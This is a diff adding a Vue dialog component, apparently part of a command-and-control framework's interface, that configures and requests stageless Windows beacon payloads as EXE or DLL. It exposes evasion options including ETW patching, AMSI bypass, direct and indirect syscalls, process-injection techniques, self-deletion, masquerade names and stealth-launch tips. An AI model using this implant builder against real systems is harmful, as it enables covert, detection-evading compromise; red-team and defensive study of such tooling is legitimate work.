@@ -1,0 +1,313 @@
+<template>
+  <el-dialog
+    v-model="visible"
+    :title="isZh ? 'Windows 可执行程序 (无阶段)' : 'Windows Executable (Stageless)'"
+    width="780px"
+    append-to-body
+    class="cs-dialog"
+    :close-on-click-modal="false"
+  >
+    <div class="cs-dialog-body">
+      <div class="cs-dialog-desc">
+        {{ isZh ? '生成无阶段 Windows 客户端载荷（完整 beacon 单文件，经后端 GenServer 模板 patch），无需分阶段拉取。' : 'Generates a stageless Windows beacon payload (single full beacon file, patched by backend GenServer) — no staging required.' }}
+      </div>
+
+      <div class="cs-form-row">
+        <label class="cs-form-label">{{ isZh ? '监听器:' : 'Listener:' }}</label>
+        <div class="cs-input-with-btn">
+          <el-input v-model="form.listener" size="small" placeholder="tcp://1.2.3.4:8080" class="cs-form-input" />
+          <button class="cs-picker-btn" :title="isZh ? '选择监听器' : 'Choose a listener'" @click="showPicker = true">...</button>
+        </div>
+      </div>
+
+      <div class="cs-form-row">
+        <label class="cs-form-label">{{ isZh ? '输出格式:' : 'Output:' }}</label>
+        <el-select v-model="form.output" size="small" class="cs-form-input">
+          <el-option :label="isZh ? 'Windows EXE（可执行文件）' : 'Windows EXE'" value="exe" />
+          <el-option :label="isZh ? 'Windows DLL（rundll32/regsvr32 加载）' : 'Windows DLL'" value="dll" />
+        </el-select>
+      </div>
+
+      <div class="cs-form-row">
+        <label class="cs-form-label">x64:</label>
+        <label class="cs-checkbox-wrap">
+          <input type="checkbox" v-model="form.x64" />
+          <span>{{ isZh ? '使用 64 位 (amd64) 载荷' : 'Use x64 (amd64) payload' }}</span>
+        </label>
+      </div>
+
+      <div class="cs-form-row">
+        <label class="cs-form-label">{{ isZh ? '上线密码:' : 'Pass:' }}</label>
+        <el-input v-model="form.pass" size="small" :placeholder="isZh ? '客户端启动上线密码（可选）' : 'Beacon startup password (optional)'" class="cs-form-input" />
+      </div>
+
+      <!-- 高级配置（OPSEC 编译期） -->
+      <el-collapse v-model="advOpen" class="cs-adv-collapse">
+        <el-collapse-item :title="isZh ? '高级配置（OPSEC）' : 'Advanced (OPSEC)'" name="adv">
+          <div class="cs-adv-grid">
+            <div class="cs-form-row">
+              <label class="cs-form-label">{{ isZh ? '重连基础延迟' : 'Reconnect delay' }}</label>
+              <el-input v-model.number="form.reconnectBaseDelay" size="small" type="number" min="1" max="60" style="width: 90px" />
+              <span class="cs-adv-unit">s（1-60）</span>
+            </div>
+            <div class="cs-form-row">
+              <label class="cs-form-label">{{ isZh ? '最大重试' : 'Max retries' }}</label>
+              <el-input v-model.number="form.reconnectMaxRetries" size="small" type="number" min="5" max="200" style="width: 90px" />
+            </div>
+            <div class="cs-form-row">
+              <label class="cs-form-label">{{ isZh ? '注入默认技术' : 'Inject tech' }}</label>
+              <el-select v-model="form.injectTech" size="small" style="width: 150px">
+                <el-option label="auto（隐蔽链）" value="auto" />
+                <el-option label="NtCreateThreadEx" value="ntc" />
+                <el-option label="QueueUserAPC" value="apc" />
+                <el-option label="CreateRemoteThread" value="crt" />
+              </el-select>
+            </div>
+            <div class="cs-form-row">
+              <label class="cs-form-label">{{ isZh ? 'ETW 补丁' : 'ETW patch' }}</label>
+              <el-switch v-model="form.etwPatch" size="small" />
+              <span class="cs-adv-unit" style="color: var(--cs-warning)">{{ isZh ? '⚠️ 需虚拟机测试, 关键进程禁用' : '⚠️ VM only, critical PIDs blocked' }}</span>
+            </div>
+            <div class="cs-form-row">
+              <label class="cs-form-label">{{ isZh ? 'AMSI 绕过' : 'AMSI bypass' }}</label>
+              <el-switch v-model="form.amsiBypass" size="small" />
+              <span class="cs-adv-unit" style="color: var(--cs-warning)">{{ isZh ? '⚠️ 需虚拟机测试' : '⚠️ VM only' }}</span>
+            </div>
+            <div class="cs-form-row">
+              <label class="cs-form-label">{{ isZh ? 'Syscall 模式' : 'Syscall mode' }}</label>
+              <el-select v-model="form.syscallMode" size="small" style="width: 150px">
+                <el-option :label="isZh ? '常规 ntdll 调用' : 'Normal (ntdll)'" value="none" />
+                <el-option :label="isZh ? '直接 syscall (仅x64)' : 'Direct syscall (x64)'" value="direct" />
+                <el-option :label="isZh ? '间接 syscall (仅x64)' : 'Indirect syscall (x64)'" value="indirect" />
+              </el-select>
+            </div>
+            <div class="cs-form-row">
+              <label class="cs-form-label">{{ isZh ? '上线自动删自身文件' : 'Auto-delete on start' }}</label>
+              <el-switch v-model="form.autoDelete" size="small" />
+              <span class="cs-adv-unit">{{ isZh ? '改名后立即删除自身(进程保持在线)' : 'unlink self after rename (stay online)' }}</span>
+            </div>
+            <div class="cs-form-row">
+              <label class="cs-form-label">{{ isZh ? '伪装修饰名' : 'Masquerade' }}</label>
+              <el-input v-model="form.masqueradeName" size="small" style="width: 130px" :placeholder="isZh ? '留空自动生成' : 'auto if empty'" />
+              <span class="cs-adv-unit">{{ isZh ? '持久化/管道/文件前缀' : 'persist/pipe/file prefix' }}</span>
+            </div>
+            <div class="cs-form-row">
+              <label class="cs-checkbox-wrap" style="width: auto">
+                <input type="checkbox" v-model="form.quietMode" />
+                <span>{{ isZh ? '静默模式（无调试输出）' : 'Quiet mode (no debug output)' }}</span>
+              </label>
+            </div>
+          </div>
+          <div class="cs-adv-hint">
+            {{ isZh ? 'OPSEC 提示：上线密码通过命令行参数传入（进程命令行可见）；不设密码则无参数启动更隐蔽。' : 'OPSEC: the beacon password is passed via command-line (visible in process args); no password means parameter-less launch (more stealthy).' }}
+          </div>
+        </el-collapse-item>
+      </el-collapse>
+    </div>
+
+    <template #footer>
+      <div class="cs-dialog-footer-center">
+        <button class="cs-btn cs-btn-primary" :disabled="generating || !form.listener" @click="handleGenerate">
+          {{ generating ? (isZh ? '生成中...' : 'Generating...') : (isZh ? '生成' : 'Generate') }}
+        </button>
+        <button class="cs-btn" @click="handleHelp">{{ isZh ? '帮助' : 'Help' }}</button>
+      </div>
+    </template>
+
+    <ChoosePayloadDialog
+      v-model="showPicker"
+      :title="isZh ? '选择监听器' : 'Choose a listener'"
+      @choose="onChooseListener"
+    />
+  </el-dialog>
+</template>
+
+<script setup lang="ts">
+import { computed, reactive, ref } from 'vue'
+import { ElMessage } from 'element-plus'
+import { useI18nStore } from '@/stores/i18n'
+import ChoosePayloadDialog, { type ListenerOption } from '../ChoosePayloadDialog.vue'
+import { generateClientBinary, extractBlobError } from './payloadUtil'
+
+const i18nStore = useI18nStore()
+const isZh = computed(() => i18nStore.isZh)
+
+const props = defineProps<{
+  modelValue: boolean
+}>()
+
+const emit = defineEmits<{
+  (e: 'update:modelValue', val: boolean): void
+}>()
+
+const visible = computed({
+  get: () => props.modelValue,
+  set: (v) => emit('update:modelValue', v),
+})
+
+const showPicker = ref(false)
+const generating = ref(false)
+
+const advOpen = ref('')
+
+const form = reactive({
+  listener: '',
+  output: 'exe',
+  x64: true,
+  pass: '',
+  vkey: '',
+  encryptSalt: '',
+  reconnectBaseDelay: 0,
+  reconnectMaxRetries: 0,
+  injectTech: '',
+  etwPatch: false,
+  amsiBypass: false,
+  syscallMode: 'none',
+  autoDelete: true,
+  masqueradeName: '',
+  quietMode: true,
+})
+
+function onChooseListener(l: ListenerOption) {
+  form.listener = l.name
+  // 选择器携带监听器完整密钥，直接使用（避免二次匹配失败回退默认密钥）
+  form.vkey = l.vkey || ''
+  form.encryptSalt = l.encryptSalt || ''
+}
+
+async function handleGenerate() {
+  if (!form.listener) {
+    ElMessage.warning(isZh.value ? '请先选择监听器' : 'Select a listener first')
+    return
+  }
+  generating.value = true
+  try {
+    const ok = await generateClientBinary({
+      listener: form.listener,
+      osType: 'windows',
+      archType: form.x64 ? 'amd64' : '386',
+      pass: form.pass,
+      format: form.output as 'exe' | 'dll',
+      vkey: form.vkey || undefined,
+      encryptSalt: form.encryptSalt || undefined,
+      reconnectBaseDelay: form.reconnectBaseDelay > 0 ? String(form.reconnectBaseDelay) : '',
+      reconnectMaxRetries: form.reconnectMaxRetries > 0 ? String(form.reconnectMaxRetries) : '',
+      injectTech: form.injectTech || undefined,
+      masqueradeName: form.masqueradeName.trim() || undefined,
+      quietMode: form.quietMode ? '1' : '0',
+      etwPatch: form.etwPatch ? '1' : '0',
+      amsiBypass: form.amsiBypass ? '1' : '0',
+      syscallMode: form.syscallMode,
+      autoDelete: form.autoDelete ? '1' : '0',
+    })
+    if (ok) {
+      ElMessage.success(isZh.value ? `${form.output.toUpperCase()} 无阶段载荷生成成功` : `Stageless ${form.output.toUpperCase()} payload generated`)
+      visible.value = false
+    } else {
+      ElMessage.error(isZh.value ? '生成失败：响应不是可下载文件' : 'Generation failed: response is not a downloadable file')
+    }
+  } catch (e: any) {
+    const msg = await extractBlobError(e)
+    ElMessage.error(isZh.value ? `生成失败: ${msg}` : `Generation failed: ${msg}`)
+  } finally {
+    generating.value = false
+  }
+}
+
+function handleHelp() {
+  ElMessage.info(isZh.value ? '无阶段载荷为完整 beacon 单文件，生成时自动匹配监听器 VKey/Salt' : 'Stageless payload is a full single-file beacon; the listener VKey/Salt is matched automatically')
+}
+</script>
+
+<style scoped>
+.cs-dialog-body {
+  display: flex;
+  flex-direction: column;
+  gap: 14px;
+}
+.cs-dialog-desc {
+  font-size: 15px;
+  color: var(--cs-text-dim);
+  line-height: 1.6;
+}
+.cs-form-row {
+  display: flex;
+  align-items: center;
+  gap: 12px;
+}
+.cs-form-label {
+  min-width: 130px;
+  max-width: 150px;
+  font-size: 15.5px;
+  color: var(--cs-text);
+  text-align: right;
+  flex-shrink: 0;
+}
+.cs-form-input {
+  flex: 1;
+}
+.cs-input-with-btn {
+  flex: 1;
+  display: flex;
+  gap: 6px;
+}
+.cs-picker-btn {
+  width: 28px;
+  height: 28px;
+  background: var(--cs-panel);
+  border: 1px solid var(--cs-border);
+  border-radius: 2px;
+  color: var(--cs-text);
+  cursor: pointer;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  font-size: 14px;
+}
+.cs-picker-btn:hover {
+  background: var(--cs-hover);
+  color: var(--cs-text-bright);
+}
+.cs-checkbox-wrap {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  color: var(--cs-text);
+  cursor: pointer;
+}
+.cs-adv-collapse {
+  border: 1px solid var(--cs-border);
+  border-radius: 2px;
+}
+.cs-adv-grid {
+  display: flex;
+  flex-direction: column;
+  gap: 6px;
+}
+.cs-adv-unit {
+  font-size: 11px;
+  color: var(--cs-text-dim);
+  white-space: nowrap;
+}
+.cs-adv-hint {
+  margin-top: 6px;
+  font-size: 11px;
+  color: var(--cs-text-dim);
+  line-height: 1.5;
+}
+.cs-checkbox-wrap {
+  display: flex;
+  align-items: center;
+  gap: 6px;
+  font-size: 12px;
+  color: var(--cs-text);
+  cursor: pointer;
+}
+
+.cs-dialog-footer-center {
+  display: flex;
+  justify-content: center;
+  gap: 8px;
+}
+</style>
